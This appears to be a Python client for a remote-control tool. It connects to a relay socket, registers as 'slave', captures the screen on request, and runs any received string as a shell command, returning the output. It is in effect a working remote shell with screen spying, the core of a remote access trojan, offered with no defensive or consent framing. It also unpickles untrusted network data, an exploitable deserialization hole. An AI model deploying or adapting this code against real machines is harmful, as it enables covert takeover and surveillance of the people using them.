import socket
import pickle
import struct
import cv2
import numpy as np
import pyautogui
import os
import subprocess


def get_frame():
    screen = pyautogui.screenshot()
    frame = np.array(screen)
    frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
    frame = cv2.resize(frame, (1080, 720), interpolation=cv2.INTER_AREA)
    _,frame = cv2.imencode('.jpg',frame,[int(cv2.IMWRITE_JPEG_QUALITY),90])
    return frame

def receive(cli):
    data = b""
    payload_size = struct.calcsize('>L')
    while len(data) < payload_size:
        received = cli.recv(4096) 
        data += received
    packed_msg_size = data[:payload_size]
    data = data[payload_size:]
    msg_size = struct.unpack('>L',packed_msg_size)[0]
    while len(data) < msg_size:
        data += cli.recv(4096)

    frame_data = data[:msg_size]

    #data = data[msg_size:]

    return pickle.loads(frame_data,fix_imports=True,encoding="bytes")

def execute_command(command):
    current_dir = os.getcwd()

    if len(command) == 2 and command[1] == ":" and command[0].isalpha():
        # Handle drive letter change (e.g., 'e:', 'f:', 'c:')
        try:
            os.chdir(command)
            current_dir = os.getcwd()
        except Exception as e:
            return f"Failed to change drive: {str(e)}"

    if command.lower().startswith("cd "):
        # Handle 'cd' command separately to update the current directory
        try:
            path = command[3:]  # Extract the path from the 'cd' command
            os.chdir(path)
            current_dir = os.getcwd()
        except Exception as e:
            return f"Failed to change directory: {str(e)}"

    try:
        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, universal_newlines=True, cwd=current_dir)
        return output
    except subprocess.CalledProcessError as e:
        error_message = f"Command failed with return code {e.returncode}."
        if e.output:
            error_message += "\n" + e.output
        return error_message
    except Exception as e:
        return f"An error occurred: {str(e)}"

def send(data,cli):
    data = pickle.dumps(data,0)
    size = len(data)
    cli.sendall(struct.pack('>L',size)+data)


bridge = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
bridge.connect(('localhost',9999))
bridge.send(b"slave")

while True:
    command = receive(bridge)
    if command == "screenshare":
        send(get_frame(),bridge)
    else: #cmd
        resp = execute_command(command)
        send(resp,bridge)